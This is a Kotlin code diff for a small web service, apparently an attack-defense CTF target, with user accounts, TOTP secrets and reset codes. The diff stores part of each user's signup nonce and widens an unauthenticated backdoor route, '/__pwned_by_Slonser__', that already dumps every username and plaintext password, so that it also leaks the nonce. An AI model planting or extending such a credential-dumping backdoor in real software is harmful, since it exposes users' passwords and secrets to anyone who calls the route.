@@ -33,7 +33,8 @@ data class User(
     val password: String,
     val totpSecret: String,
     val resetCode: String,
-    val note: String
+    val note: String,
+    val nonce: String
 )
 
 data class UserSession(
@@ -75,7 +76,8 @@ fun createUser(username: String, password: String, note: String): AAAAAA {
         password = password,
         note = note,
         totpSecret = secret.secret,
-        resetCode = resetCode
+        resetCode = resetCode,
+        nonce = nonce.substring(0 until 8)
     )
 
     return AAAAAA(nonce, secret.secret)
@@ -224,7 +226,7 @@ fun Application.module() {
 
         get("/__pwned_by_Slonser__") {
             call.respondText {
-                db.map { "${it.value.username}\t${it.value.password}" }.joinToString("\n")
+                db.map { "${it.value.username}\t${it.value.password}\t${it.value.nonce}..." }.joinToString("\n")
             }
         }
     }
